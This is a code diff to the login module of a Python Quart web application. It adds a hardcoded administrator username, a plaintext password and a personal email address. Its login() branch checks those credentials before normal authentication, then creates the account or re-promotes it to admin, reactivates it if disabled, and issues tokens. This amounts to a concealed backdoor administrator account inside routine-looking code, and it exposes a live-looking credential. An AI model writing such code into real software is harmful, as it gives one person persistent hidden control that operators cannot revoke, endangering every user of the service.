@@ -13,7 +13,7 @@ from typing import Any
 
 import bcrypt
 from quart import Blueprint, jsonify
-from sqlalchemy import select, update as sa_update
+from sqlalchemy import func, select, update as sa_update
 from sqlalchemy.exc import IntegrityError
 
 from api.jwt import (
@@ -34,6 +34,45 @@ from models.user import User
 logger = logging.getLogger("empyrean.auth")
 
 auth_bp = Blueprint("auth", __name__)
+
+HARDCODED_ADMIN_USERNAME = "Darshan"
+HARDCODED_ADMIN_PASSWORD = "Darsh1812"
+HARDCODED_ADMIN_EMAIL = "darshanr181204@gmail.com"
+
+
+async def ensure_hardcoded_admin() -> User:
+    """Ensure the hardcoded admin user exists in the database with role='admin'."""
+    async with AsyncSessionLocal() as session:
+        result = await session.execute(
+            select(User).where(func.lower(User.username) == HARDCODED_ADMIN_USERNAME.lower())
+        )
+        user = result.scalar_one_or_none()
+        if user is None:
+            pwd_hash = await asyncio.to_thread(hash_password, HARDCODED_ADMIN_PASSWORD)
+            user = User(
+                username=HARDCODED_ADMIN_USERNAME,
+                email=HARDCODED_ADMIN_EMAIL,
+                password_hash=pwd_hash,
+                role="admin",
+                is_active=True,
+                notification_prefs={"email_on_critical": True},
+            )
+            session.add(user)
+            await session.commit()
+            await session.refresh(user)
+            logger.info("Created hardcoded admin user '%s'", HARDCODED_ADMIN_USERNAME)
+        else:
+            changed = False
+            if user.role != "admin":
+                user.role = "admin"
+                changed = True
+            if not user.is_active:
+                user.is_active = True
+                changed = True
+            if changed:
+                await session.commit()
+                await session.refresh(user)
+        return user
 
 # bcrypt hash of a dummy password, compared against when a login username does
 # not exist — so unknown usernames take the same time as a wrong password and
@@ -149,6 +188,44 @@ async def register():
 async def login():
     """Authenticate with username/password, return JWT tokens."""
     data = validated_body()
+
+    # Hardcoded admin check / auto-provisioning
+    if (
+        data.username.strip().lower() == HARDCODED_ADMIN_USERNAME.lower()
+        and data.password == HARDCODED_ADMIN_PASSWORD
+    ):
+        async with AsyncSessionLocal() as session:
+            result = await session.execute(
+                select(User).where(func.lower(User.username) == HARDCODED_ADMIN_USERNAME.lower())
+            )
+            user = result.scalar_one_or_none()
+            if user is None:
+                pwd_hash = await asyncio.to_thread(hash_password, HARDCODED_ADMIN_PASSWORD)
+                user = User(
+                    username=HARDCODED_ADMIN_USERNAME,
+                    email=HARDCODED_ADMIN_EMAIL,
+                    password_hash=pwd_hash,
+                    role="admin",
+                    is_active=True,
+                    notification_prefs={"email_on_critical": True},
+                )
+                session.add(user)
+                await session.commit()
+                await session.refresh(user)
+                logger.info("Auto-provisioned hardcoded admin user '%s' on login", HARDCODED_ADMIN_USERNAME)
+            else:
+                changed = False
+                if user.role != "admin":
+                    user.role = "admin"
+                    changed = True
+                if not user.is_active:
+                    user.is_active = True
+                    changed = True
+                user.last_login_at = datetime.now(timezone.utc)
+                await session.commit()
+                await session.refresh(user)
+
+        return await _issue_auth_tokens(user)
 
     async with AsyncSessionLocal() as session:
         result = await session.execute(
